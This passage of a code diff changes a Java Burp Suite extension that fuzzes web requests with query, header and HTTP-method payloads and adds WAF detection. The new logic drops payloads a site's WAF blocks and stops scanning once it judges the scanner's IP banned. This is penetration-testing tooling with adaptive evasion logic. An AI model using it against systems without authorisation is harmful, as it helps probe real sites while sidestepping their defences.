+        bot.add(btns, BorderLayout.SOUTH);
         panel.add(bot, BorderLayout.SOUTH);
 
         parent.add(panel);
@@ -451,11 +578,46 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
 
     private List<String> getTableData(JTable table) {
         List<String> list = new ArrayList<>();
-        for (int i = 0; i < table.getRowCount(); i++) list.add(table.getValueAt(i, 0).toString());
+        for (int i = 0; i < table.getRowCount(); i++) {
+            list.add(table.getValueAt(i, 0).toString());
+        }
         return list;
     }
 
-    // 净化关键字，防止带有 HTTP 或 /* 导致匹配失败
+    // --- WAF 核心识别与探针逻辑 ---
+    private String detectWAF(byte[] responseBytes) {
+        if (responseBytes == null || !cEnableWafDetect) return null;
+        try {
+            String respStr = helpers.bytesToString(responseBytes);
+            for (Map.Entry<String, Pattern> entry : cWafPatterns.entrySet()) {
+                if (entry.getValue().matcher(respStr).find()) {
+                    return entry.getKey();
+                }
+            }
+        } catch (Exception e) {}
+        return null;
+    }
+
+    private void updateWafUI(String host) {
+        SwingUtilities.invokeLater(() -> {
+            WafProfile profile = wafMap.get(host);
+            if (profile == null) return;
+
+            boolean found = false;
+            for (int i = 0; i < wafTableModel.getRowCount(); i++) {
+                if (wafTableModel.getValueAt(i, 0).equals(host)) {
+                    wafTableModel.setValueAt(profile.isIpBanned ? "[危险] 已被墙" : "正常", i, 2);
+                    wafTableModel.setValueAt(profile.blacklistedPoCs.size(), i, 3);
+                    found = true;
+                    break;
+                }
+            }
+            if (!found) {
+                wafTableModel.addRow(new Object[]{host, profile.wafName, profile.isIpBanned ? "[危险] 已被墙" : "正常", profile.blacklistedPoCs.size()});
+            }
+        });
+    }
+
     private String cleanKeyword(String kw) {
         String s = kw.trim().toLowerCase();
         s = s.replace("http://", "").replace("https://", "");
@@ -482,13 +644,11 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         String host = url.getHost().toLowerCase();
         for (String kw : cWhitelist) {
             String cleanKw = cleanKeyword(kw);
-            // 只要域名包含该干净的关键字即可 (如 z12.cnzz.com 包含 cnzz)
             if (!cleanKw.isEmpty() && host.contains(cleanKw)) {
                 return true;
             }
         }
-        // 如果没匹配到，向控制台打印原因，方便排查
-        callbacks.printOutput("[-] 丢弃 (白名单未匹配): Host [" + host + "] 不包含你配置的任意关键字");
+        callbacks.printOutput("[-] 丢弃 (未命中白名单): Host [" + host + "] 不包含你配置的任意关键字");
         return false;
     }
 
@@ -499,17 +659,17 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             String[] parts = respStr.split("\r\n\r\n", 2);
             if (parts.length == 2) {
                 return parts[1].length();
-            } else {
-                return 0;
             }
+            return 0;
         } catch (Exception e) {
             return 0;
         }
     }
 
+    // --- 核心入口：被动监听 ---
     @Override
     public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
-        if (messageIsRequest || !cAutoScan) return; // 没开启主开关直接退出
+        if (messageIsRequest || !cAutoScan) return;
 
         boolean isProxy = (toolFlag == IBurpExtenderCallbacks.TOOL_PROXY);
         boolean isRepeater = (toolFlag == IBurpExtenderCallbacks.TOOL_REPEATER);
@@ -520,6 +680,15 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         byte[] response = messageInfo.getResponse();
         if (response == null) return;
 
+        IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo);
+        URL url = reqInfo.getUrl();
+        if (cWhitelistOnly && !isWhitelisted(url)) return;
+
+        // 【WAF 拦截网关】如果 IP 已被墙，直接拦截被动扫描，不再做无用功
+        if (wafMap.containsKey(url.getHost()) && wafMap.get(url.getHost()).isIpBanned) {
+            return;
+        }
+
         IResponseInfo info = helpers.analyzeResponse(response);
         int statusCode = info.getStatusCode();
         boolean matched = false;
@@ -529,32 +698,15 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             if (String.valueOf(statusCode).equals(code.trim())) { matched = true; break; }
         }
 
-        if (!matched && cEnableRegex) {
-            String regex = cRegexStr.trim();
-            if (!regex.isEmpty()) {
-                byte[] body = Arrays.copyOfRange(response, info.getBodyOffset(), response.length);
-                String bodyStr = helpers.bytesToString(body);
-                if (Pattern.compile(regex, Pattern.CASE_INSENSITIVE).matcher(bodyStr).find()) matched = true;
-            }
+        if (!matched && cEnableRegex && cRegexPattern != null) {
+            byte[] body = Arrays.copyOfRange(response, info.getBodyOffset(), response.length);
+            String bodyStr = helpers.bytesToString(body);
+            if (cRegexPattern.matcher(bodyStr).find()) matched = true;
         }
 
         if (matched) {
-            IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo);
-            URL url = reqInfo.getUrl();
             String dedupKey = reqInfo.getMethod() + "_" + url.getHost() + url.getPath();
-
-            if (isExcluded(url)) {
-                callbacks.printOutput("[-] 丢弃 (黑名单后缀): " + url.getPath());
-                return;
-            }
-            if (!isWhitelisted(url)) {
-                return; // isWhitelisted 内部已经打印过日志了
-            }
-            if (dedupCache.contains(dedupKey)) {
-                // 去重丢弃，不打印，防止刷屏
-                return;
-            }
-
+            if (isExcluded(url) || dedupCache.contains(dedupKey)) return;
             dedupCache.add(dedupKey);
 
             List<String> modes = new ArrayList<>();
@@ -563,12 +715,13 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             if (cScanMethod) modes.add("method");
 
             if (!modes.isEmpty()) {
-                callbacks.printOutput("[+] 触发自动扫描: " + url.toString());
+                callbacks.printOutput("[+] 触发被动扫描: " + url.toString());
                 executor.submit(() -> doScan(messageInfo, modes));
             }
         }
     }
 
+    // --- 核心补全：右键主动扫描菜单 ---
     @Override
     public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
         List<JMenuItem> list = new ArrayList<>();
@@ -599,10 +752,12 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         }
     }
 
+    // --- 核心扫描与 WAF 调度引擎 ---
     private void doScan(IHttpRequestResponse baseMsg, List<String> modes) {
         IHttpService service = baseMsg.getHttpService();
         byte[] origReqBytes = baseMsg.getRequest();
         IRequestInfo origReqInfo = helpers.analyzeRequest(service, origReqBytes);
+        String host = origReqInfo.getUrl().getHost();
 
         byte[] origRespBytes = baseMsg.getResponse();
         if (origRespBytes == null) {
@@ -618,6 +773,70 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         String path = origReqInfo.getUrl().getPath();
         String query = origReqInfo.getUrl().getQuery();
 
+        // 统一的发包与 WAF 拦截处理函数
+        class PayloadRunner {
+            void run(String type, String payloadStr, byte[] newReq) {
+                // 1. 全局 IP 封禁拦截
+                WafProfile profile = wafMap.get(host);
+                if (profile != null && profile.isIpBanned) return;
+
+                // 2. 动态黑名单拦截 (如果该 PoC 已经被该站点的 WAF 拦过，直接跳过)
+                if (cEnableDynamicBlacklist && profile != null && profile.blacklistedPoCs.contains(payloadStr)) {
+                    return;
+                }
+
+                try {
+                    long start = System.currentTimeMillis();
+                    IHttpRequestResponse res = callbacks.makeHttpRequest(service, newReq);
+                    long time = System.currentTimeMillis() - start;
+
+                    if (res.getResponse() != null) {
+                        int nLen = getBodyLength(res.getResponse());
+                        int statusCode = helpers.analyzeResponse(res.getResponse()).getStatusCode();
+
+                        // 3. WAF 探针逻辑
+                        String wafDetected = detectWAF(res.getResponse());
+                        if (wafDetected != null) {
+                            if (profile == null) {
+                                profile = new WafProfile();
+                                profile.wafName = wafDetected;
+                                wafMap.put(host, profile);
+                            }
+
+                            if (cEnableDynamicBlacklist) {
+                                boolean ipBannedConfirm = false;
+                                // 探活机制：如果开启了 IP 验证，补发一次原始的安全包
+                                if (cEnableIpBanCheck) {
+                                    IHttpRequestResponse testBase = callbacks.makeHttpRequest(service, origReqBytes);
+                                    if (testBase.getResponse() != null && detectWAF(testBase.getResponse()) != null) {
+                                        ipBannedConfirm = true; // 原始包也被 WAF 拦了，彻底被墙
+                                    }
+                                }
+
+                                if (ipBannedConfirm) {
+                                    profile.isIpBanned = true;
+                                    callbacks.printOutput("[!] 危险警告: " + host + " 的 IP 已被 " + wafDetected + " 封禁！自动终止该站点的后续扫描。");
+                                } else {
+                                    // IP 没墙，拉黑这个惹事的 PoC
+                                    profile.blacklistedPoCs.add(payloadStr);
+                                    callbacks.printOutput("[-] PoC 拦截: '" + payloadStr + "' 触发了 WAF，已动态加入该站点黑名单。");
+                                }
+                                updateWafUI(host);
+                            }
+                        }
+
+                        // 如果已经被墙了，这条垃圾数据就没必要显示在前端结果表格里了
+                        if (profile != null && profile.isIpBanned) return;
+
+                        PayloadResult pr = new PayloadResult(type, payloadStr, nLen, nLen - origLen, (int)time, statusCode, res);
+                        SwingUtilities.invokeLater(new AddPayloadRunnable(BurpExtender.this, task, pr));
+                    }
+                } catch (Exception ignored) {}
+            }
+        }
+        PayloadRunner runner = new PayloadRunner();
+
+        // 1. Query 执行逻辑
         if (modes.contains("query")) {
             for (String payload : cQueryPayloads) {
                 for (String pTest : generatePermutations(path, payload)) {
@@ -631,22 +850,16 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
                             newHeaders.set(0, parts[0] + " " + newUri + (parts.length >= 3 ? " " + parts[2] : ""));
                         }
 
-                        byte[] newReq = helpers.buildHttpMessage(newHeaders, baseBody);
-                        long start = System.currentTimeMillis();
-                        IHttpRequestResponse res = callbacks.makeHttpRequest(service, newReq);
-                        long time = System.currentTimeMillis() - start;
+                        // 核心修复：只在这里进行智能缩写判断，然后丢给统一的 runner 引擎去发包
+                        String displayPayload = path.length() > 1 ? pTest.replace(path, "...") : pTest;
+                        runner.run("Query", displayPayload, helpers.buildHttpMessage(newHeaders, baseBody));
 
-                        if (res.getResponse() != null) {
-                            int nLen = getBodyLength(res.getResponse());
-                            int statusCode = helpers.analyzeResponse(res.getResponse()).getStatusCode();
-                            PayloadResult pr = new PayloadResult("Query", pTest.replace(path, "..."), nLen, nLen - origLen, (int)time, statusCode, res);
-                            SwingUtilities.invokeLater(new AddPayloadRunnable(this, task, pr));
-                        }
                     } catch (Exception ignored) {}
                 }
             }
         }
 
+        // 2. Header
         if (modes.contains("header")) {
             for (String payload : cHeaderPayloads) {
                 try {
@@ -659,22 +872,12 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
                         }
                     }
                     if (!updated) newHeaders.add(payload);
-
-                    byte[] newReq = helpers.buildHttpMessage(newHeaders, baseBody);
-                    long start = System.currentTimeMillis();
-                    IHttpRequestResponse res = callbacks.makeHttpRequest(service, newReq);
-                    long time = System.currentTimeMillis() - start;
-
-                    if (res.getResponse() != null) {
-                        int nLen = getBodyLength(res.getResponse());
-                        int statusCode = helpers.analyzeResponse(res.getResponse()).getStatusCode();
-                        PayloadResult pr = new PayloadResult("Header", payload, nLen, nLen - origLen, (int)time, statusCode, res);
-                        SwingUtilities.invokeLater(new AddPayloadRunnable(this, task, pr));
-                    }
+                    runner.run("Header", payload, helpers.buildHttpMessage(newHeaders, baseBody));
                 } catch (Exception ignored) {}
             }
         }
 
+        // 3. Method
         if (modes.contains("method")) {
             for (String payload : cMethodPayloads) {
                 if (!payload.contains("->")) continue;
@@ -682,35 +885,24 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
                 String from = parts[0].trim();
                 String to = parts[1].trim();
 
-                List<String> newHeaders = new ArrayList<>(baseHeaders);
-                byte[] newBody = baseBody.clone();
-                String firstLine = newHeaders.get(0);
+                try {
+                    List<String> newHeaders = new ArrayList<>(baseHeaders);
+                    byte[] newBody = baseBody.clone();
+                    String firstLine = newHeaders.get(0);
 
-                if (firstLine.contains(from)) {
-                    newHeaders.set(0, firstLine.replaceFirst(from, to));
+                    if (firstLine.contains(from)) {
+                        newHeaders.set(0, firstLine.replaceFirst(from, to));
 
-                    if (to.equals("GET") || to.equals("HEAD") || to.equals("OPTIONS")) {
-                        newHeaders.removeIf(h -> h.toLowerCase().startsWith("content-length:") || h.toLowerCase().startsWith("content-type:"));
-                        newBody = new byte[0];
-                    } else if (to.equals("POST") || to.equals("PUT")) {
-                        boolean hasCl = newHeaders.stream().anyMatch(h -> h.toLowerCase().startsWith("content-length:"));
-                        if (!hasCl) newHeaders.add("Content-Length: " + newBody.length);
-                    }
-
-                    try {
-                        byte[] newReq = helpers.buildHttpMessage(newHeaders, newBody);
-                        long start = System.currentTimeMillis();
-                        IHttpRequestResponse res = callbacks.makeHttpRequest(service, newReq);
-                        long time = System.currentTimeMillis() - start;
-
-                        if (res.getResponse() != null) {
-                            int nLen = getBodyLength(res.getResponse());
-                            int statusCode = helpers.analyzeResponse(res.getResponse()).getStatusCode();
-                            PayloadResult pr = new PayloadResult("Method", payload, nLen, nLen - origLen, (int)time, statusCode, res);
-                            SwingUtilities.invokeLater(new AddPayloadRunnable(this, task, pr));
+                        if (to.equals("GET") || to.equals("HEAD") || to.equals("OPTIONS") || to.equals("TRACE")) {
+                            newHeaders.removeIf(h -> h.toLowerCase().startsWith("content-length:") || h.toLowerCase().startsWith("content-type:"));
+                            newBody = new byte[0];
+                        } else if (to.equals("POST") || to.equals("PUT")) {
+                            boolean hasCl = newHeaders.stream().anyMatch(h -> h.toLowerCase().startsWith("content-length:"));
+                            if (!hasCl) newHeaders.add("Content-Length: " + newBody.length);
                         }
-                    } catch (Exception ignored) {}
-                }
+                        runner.run("Method", payload, helpers.buildHttpMessage(newHeaders, newBody));
+                    }
+                } catch (Exception ignored) {}
             }
         }
     }
@@ -737,17 +929,20 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         List<PayloadResult> results = new CopyOnWriteArrayList<>();
         ScanTask(int id, String m, String u, int len) { this.task_id = id; this.method = m; this.url = u; this.orig_len = len; }
     }
+
     class PayloadResult {
         String type, payload; int newLen, diff, timeMs, status; IHttpRequestResponse reqRes;
         PayloadResult(String t, String p, int nl, int d, int tm, int s, IHttpRequestResponse rr) {
             type = t; payload = p; newLen = nl; diff = d; timeMs = tm; status = s; reqRes = rr;
         }
     }
+
     class AddTaskRunnable implements Runnable {
         BurpExtender ext; ScanTask task;
         AddTaskRunnable(BurpExtender ext, ScanTask task) { this.ext = ext; this.task = task; }
         public void run() { ext.scanTasks.add(task); ext.urlTableModel.addRow(new Object[]{task.task_id, task.method, task.url, task.orig_len}); }
     }
+
     class AddPayloadRunnable implements Runnable {
         BurpExtender ext; ScanTask task; PayloadResult pr;
         AddPayloadRunnable(BurpExtender ext, ScanTask task, PayloadResult pr) { this.ext = ext; this.task = task; this.pr = pr; }
